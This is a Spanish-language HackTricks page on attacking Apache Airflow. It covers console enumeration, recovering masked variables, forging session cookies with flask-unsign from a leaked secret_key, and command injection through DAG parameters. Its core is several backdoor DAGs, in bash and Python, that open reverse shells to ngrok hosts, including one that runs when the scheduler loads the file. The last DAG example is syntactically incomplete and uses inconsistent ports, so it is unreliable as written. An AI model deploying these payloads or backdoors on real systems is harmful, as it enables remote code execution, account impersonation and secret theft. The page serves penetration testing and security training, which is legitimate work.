# Seguridad de Apache Airflow

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos en** **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.

</details>
{% endhint %}

### Informaci칩n B치sica

[**Apache Airflow**](https://airflow.apache.org) sirve como una plataforma para **orquestar y programar tuber칤as de datos o flujos de trabajo**. El t칠rmino "orquestaci칩n" en el contexto de las tuber칤as de datos significa el proceso de organizar, coordinar y gestionar flujos de trabajo de datos complejos que provienen de diversas fuentes. El prop칩sito principal de estas tuber칤as de datos orquestadas es proporcionar conjuntos de datos procesados y consumibles. Estos conjuntos de datos son utilizados extensamente por una multitud de aplicaciones, incluyendo, pero no limitado a, herramientas de inteligencia empresarial, modelos de ciencia de datos y aprendizaje autom치tico, todos los cuales son fundamentales para el funcionamiento de aplicaciones de big data.

B치sicamente, Apache Airflow te permitir치 **programar la ejecuci칩n de c칩digo cuando algo** (evento, cron) **suceda**.

### Laboratorio Local

#### Docker-Compose

Puedes usar el **archivo de configuraci칩n de docker-compose de** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) para lanzar un entorno docker completo de apache airflow. (Si est치s en MacOS aseg칰rate de darle al menos 6GB de RAM a la VM de docker).

#### Minikube

Una forma f치cil de **ejecutar apache airflow** es ejecutarlo **con minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Configuraci칩n de Airflow

Airflow podr칤a almacenar **informaci칩n sensible** en su configuraci칩n o puedes encontrar configuraciones d칠biles en su lugar:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### RBAC de Airflow

Antes de comenzar a atacar Airflow, deber칤as entender **c칩mo funcionan los permisos**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### Ataques

#### Enumeraci칩n de la Consola Web

Si tienes **acceso a la consola web**, podr칤as acceder a parte o toda la siguiente informaci칩n:

* **Variables** (Informaci칩n sensible personalizada podr칤a estar almacenada aqu칤)
* **Conexiones** (Informaci칩n sensible personalizada podr칤a estar almacenada aqu칤)
* Acceder a ellas en `http://<airflow>/connection/list/`
* [**Configuraci칩n**](./#airflow-configuration) (Informaci칩n sensible como el **`secret_key`** y contrase침as podr칤a estar almacenada aqu칤)
* Listar **usuarios y roles**
* **C칩digo de cada DAG** (que podr칤a contener informaci칩n interesante)

#### Recuperar Valores de Variables

Las variables pueden ser almacenadas en Airflow para que los **DAGs** puedan **acceder** a sus valores. Es similar a los secretos de otras plataformas. Si tienes **suficientes permisos**, puedes acceder a ellas en la GUI en `http://<airflow>/variable/list/`.\
Airflow por defecto mostrar치 el valor de la variable en la GUI, sin embargo, de acuerdo a [**esto**](https://marclamberti.com/blog/variables-with-apache-airflow/), es posible establecer una **lista de variables** cuyo **valor** aparecer치 como **asteriscos** en la **GUI**.

![](<../../.gitbook/assets/image (164).png>)

Sin embargo, estos **valores** a칰n pueden ser **recuperados** a trav칠s de **CLI** (necesitas tener acceso a la base de datos), ejecuci칩n de **DAG** **arbitrarios**, **API** accediendo al endpoint de variables (la API necesita estar activada), y **춰incluso la propia GUI!**\
Para acceder a esos valores desde la GUI, simplemente **selecciona las variables** que deseas acceder y **haz clic en Acciones -> Exportar**.\
Otra forma es realizar un **bruteforce** al **valor oculto** utilizando el **filtro de b칰squeda** hasta que lo obtengas:

![](<../../.gitbook/assets/image (152).png>)

#### Escalaci칩n de Privilegios

Si la configuraci칩n **`expose_config`** est치 establecida en **True**, desde el **rol Usuario** y **hacia arriba** pueden **leer** la **configuraci칩n en la web**. En esta configuraci칩n, aparece el **`secret_key`**, lo que significa que cualquier usuario con esto v치lido puede **crear su propia cookie firmada para suplantar cualquier otra cuenta de usuario**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG Backdoor (RCE en el trabajador de Airflow)

Si tienes **acceso de escritura** al lugar donde se **guardan los DAGs**, puedes simplemente **crear uno** que te enviar치 un **reverse shell.**\
Ten en cuenta que este reverse shell se ejecutar치 dentro de un **contenedor de trabajador de airflow**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG Backdoor (RCE en el programador de Airflow)

Si configuras algo para que sea **ejecutado en la ra칤z del c칩digo**, en el momento de escribir esto, ser치 **ejecutado por el programador** despu칠s de un par de segundos de colocarlo dentro de la carpeta del DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### Creaci칩n de DAG

Si logras **comprometer una m치quina dentro del cl칰ster DAG**, puedes crear nuevos **scripts de DAG** en la carpeta `dags/` y ser치n **replicados en el resto de las m치quinas** dentro del cl칰ster DAG.

#### Inyecci칩n de C칩digo en DAG

Cuando ejecutas un DAG desde la GUI puedes **pasar argumentos** a 칠l.\
Por lo tanto, si el DAG no est치 correctamente codificado, podr칤a ser **vulnerable a la Inyecci칩n de Comandos.**\
Eso es lo que ocurri칩 en este CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Todo lo que necesitas saber para **comenzar a buscar inyecciones de comandos en DAGs** es que los **par치metros** son **accedidos** con el c칩digo **`dag_run.conf.get("param_name")`**.

Adem치s, la misma vulnerabilidad podr칤a ocurrir con **variables** (ten en cuenta que con suficientes privilegios podr칤as **controlar el valor de las variables** en la GUI). Las variables son **accedidas con**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Si se utilizan, por ejemplo, dentro de un comando bash, podr칤as realizar una inyecci칩n de comandos.

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
